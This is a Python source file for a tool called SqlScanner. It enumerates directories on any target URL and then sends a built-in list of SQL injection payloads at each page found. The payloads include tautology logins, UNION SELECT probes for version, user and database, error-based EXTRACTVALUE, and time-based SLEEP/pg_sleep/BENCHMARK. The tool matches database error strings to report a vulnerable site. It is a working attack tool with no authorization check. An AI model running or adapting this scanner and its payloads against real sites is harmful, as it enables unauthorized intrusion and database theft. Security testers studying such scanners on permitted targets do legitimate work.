import requests
import argparse
import time
from urllib.parse import urlparse
import urllib3

# ANSI color codes for terminal output
RED = '\033[91m'
GREEN = '\033[92m'
ORANGE = '\033[38;5;208m'
YELLOW = '\033[93m'
PURPLE = '\033[34m'
CYAN = '\033[36m'
RESET = '\033[0m'
BLUE = '\033[38;5;32m'

# List of SQL injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    '" OR "1"="1',
    '" OR "1"="1" -- ',
    "' OR 1=1 -- ",
    "' OR 'a'='a",
    "1' ORDER BY 1 --",
    "1' UNION SELECT NULL --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT @@version--",
    "' UNION SELECT user()--",
    "' UNION SELECT database()--",
    "' AND EXTRACTVALUE(1, CONCAT(0x5c,(SELECT @@version)))--",
    "' AND 1=CAST(0x41424344 AS int)--",
    "' OR IF(1=1, SLEEP(5), 0)--",
    "' OR SLEEP(5)--",
    "' OR pg_sleep(5)--",
    "' OR pg_sleep(5);--",
    "' OR '1'='1' AND SLEEP(5)--",
    "' AND IF(1=1, SLEEP(5), 0)--",
    "' OR BENCHMARK(1000000,MD5(1))--"
]

# Common SQL syntax errors to detect vulnerabilities
errors = [
    "mysqli_fetch_array",
    "SQL syntax",
    "Warning: mysql_",
    "Warning: mysqli_",
    "Unclosed quotation mark",
    "SQLSTATE",
    "syntax error",
    "Unknown column",
    "Incorrect integer value",
    "Table doesn't exist",
    "Data too long",
    "Subquery returns more than 1 row",
    "You have an error in your SQL syntax",
    "Out of range value for column",
    "MySQL server has gone away",
    "Lost connection to MySQL server",
    "mysql_escape_string()",
    "Warning: mysql_num_rows()",
    "Warning: mysql_query()",
    "Warning: mysqli_query()",
    "Error Code:",
    "Access denied for user",
    "No database selected",
    "Unknown database",
    "Can't connect to MySQL server",
    "Column count doesn't match",
    "Cannot add or update a child row",
    "Foreign key constraint fails"
]

def SqlInjectionScanner(url):
    url = url if url.startswith(('http://', 'https://')) else 'http://' + url
    url = url.rstrip('/') + '/' if '?' not in url else url

    vulnerable = False

    for payload in payloads:
        testUrl = f"{url}{payload}"
        try:
            response = requests.get(testUrl, timeout=5)

            if response.status_code == 200:
                if any(error in response.text for error in errors):
                    print(f"{GREEN}[*] Vulnerability Found: {RESET}{CYAN}{testUrl}{RESET}")
                    if output:
                        with open(args.output, 'w') as outputFile:
                            outputFile.write(f"[*] Vulnerability Found: {testUrl}")
                    return True

                print(f"{ORANGE}[!] Attempted Payload: {RESET}{YELLOW}{payload}{RESET}")

                if args.timeout:
                    time.sleep(args.timeout)

            elif response.status_code == 404:
                print(f"{RED}Error:{RESET} No such URL")
                exit(1)

            elif response.status_code == 403:
                print(f"{RED}Error:{RESET} You are not authorized to access the URL")
                exit(1)
            
            else:
                print("Error: No Valid URL")

        except requests.exceptions.ConnectionError:
            print(f"{RED}Error:{RESET} Unable to connect to the specified URL.")
            exit(1)

        except Exception as e:
            print(f"{RED}Error: {RESET}{e}")

    print(f"{RED}[*] No Vulnerability found.{RESET}")
    return vulnerable

def DirectoryFinder(url):
    url = url if url.startswith(('http://', 'https://')) else 'http://' + url
    filePath = "/Users/m.emirhan/Desktop/wordlist.txt"
    with open(filePath, "r") as file:
        directories = [line.strip() for line in file]

    for dr in directories:
        test_url = f"{url}/{dr}"
        try:
            response = requests.get(test_url, allow_redirects=True, timeout=5)

            if response.status_code == 200:
                print(f"Found: {test_url}")
                SqlInjectionScanner(test_url)  # Burada dizin için SQL injection testi yapılacak

            else:
                print(f"Not found: {test_url}")

        except requests.exceptions.RequestException as e:
            print(f"Error accessing {test_url}")
            exit(1)

        except urllib3.exceptions.InsecureRequestWarning:
            print("error")
            exit(1)

def SqlScannerText():
    print(f"""   _____       _  _____                                 
  / ____|     | |/ ____|                               
 | (___   __ _| | (___   ___ __ _ _ __  _ __   ___ _ __ 
  \___ \ / _` | |\___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
  ____) | (_| | |____) | (_| (_| | | | | | | |  __/ |{GREEN}1.0{RESET}  
 |_____/ \__, |_|_____/ \___\__,_|_| |_|_| |_|\___|_|   
            | |               
            |_|         {RED}jayant{RESET}   {BLUE}memirhan{RESET}   {ORANGE}govind{RESET}  
--------------------------------------------------------""")

class CustomFormatter(argparse.HelpFormatter):
    def _format_action(self, action):
        if action.option_strings:
            option_string = ', '.join(action.option_strings)
            helpText = action.help if action.help else ''
            return f"  {option_string:<20} {helpText}\n"
        return ''

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description=SqlScannerText(),
        formatter_class=CustomFormatter,
        add_help=False
    )
    parser.add_argument('-u', '--url', type=str, required=True, help=f"{CYAN}Target site URL {RESET}{ORANGE}[REQUIRED]{RESET}")
    parser.add_argument('-t', '--timeout', type=int, help=f"{CYAN}Timeout in seconds{RESET}{ORANGE} [OPTIONAL]{RESET}")
    parser.add_argument('-o', '--output', type=str, help=f"{CYAN}File to save the scan results to {RESET}{ORANGE}[OPTIONAL]{RESET}")
    parser.add_argument('-h', '--help', action="help", help=f'{CYAN}Show this help message and exit{RESET}')

    args = parser.parse_args()
    url = args.url
    timeout = args.timeout
    output = args.output

    DirectoryFinder(url)
